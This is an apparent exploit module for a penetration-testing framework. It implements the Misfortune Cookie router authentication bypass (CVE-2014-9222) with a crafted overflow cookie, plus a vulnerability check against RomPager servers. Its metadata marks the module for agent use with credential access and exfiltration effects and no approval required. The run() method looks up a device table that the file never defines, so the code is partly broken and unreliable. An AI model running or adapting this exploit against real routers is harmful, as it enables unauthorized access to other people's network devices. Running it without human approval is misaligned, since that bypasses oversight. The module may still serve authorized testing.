#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Misfortune Cookie"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Misfortune Cookie',
        'description': 'Exploit implementation for Misfortune Cookie Authentication Bypass vulnerability.',
        'author': ['Check Point', 'Jan Trencansky', 'Marcin Bury', 'Milad Doorbash'],
        'cve': ['CVE-2014-9222'],
        'platform': Platform.LINUX,
        'references': ['http://mis.fortunecook.ie/', 'http://embedsec.systems/embedded-device-security/2015/02/16/Misfortune-Cookie-CVE-2014-9222-Demystified.html', 'http://piotrbania.com/all/articles/tplink_patch', 'https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/10/porting-the-misfortune-cookie-exploit-whitepaperpdf'],
        'tags': ['iot', 'router', 'unauth', 'cve-2014-9222', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    device = OptInteger("", "Target device (show devices)")

    def run(self):
        devices = self._Exploit__info__['devices']
        if self.device == "" or re.match(r"^\d+?$", self.device) is None or int(self.device) < 0 or int(self.device) >= len(devices):
            print_error("Invalid device identifier option")
            return
        number = devices[int(self.device)]['number']
        offset = devices[int(self.device)]['offset']
        user_agent = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'
        headers = {'User-Agent': user_agent,
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-language': 'sk,cs;q=0.8,en-US;q=0.5,en;q,0.3',
                   'Connection': 'keep-alive',
                   'Accept-Encoding': 'gzip, deflate',
                   'Cache-Control': 'no-cache',
                   'Cookie': 'C' + str(number) + '=' + 'B' * offset + '\x00'}

        response = self.http_request(
            method="GET",
            path="/",
            headers=headers
        )

        if response is not None and response.status_code <= 302:
            print_success(
                "Seems good but check " +
                "{}:{} ".format(self.target, self.port) +
                "using your browser to verify if authentication is disabled or not."
            )
            return True
        else:
            print_error("Failed.")
    def check(self):
        user_agent = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'
        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-language": "sk,cs;q=0.8,en-US;q=0.5,en;q,0.3",
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "Cookie": "C107373883=/omg1337hax",
        }

        response = self.http_request(
            method="GET",
            path="/test",
            headers=headers
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code != 404:
            return False  # not rompage
        else:
            if 'server' in response.headers:
                server = response.headers.get('server')

                if re.search('RomPager', server) is not None:
                    if re.search('omg1337hax', response.text) is not None:
                        return True  # device is vulnerable
                    else:
                        return None  # could not verify

        return False  # target is not vulnerable
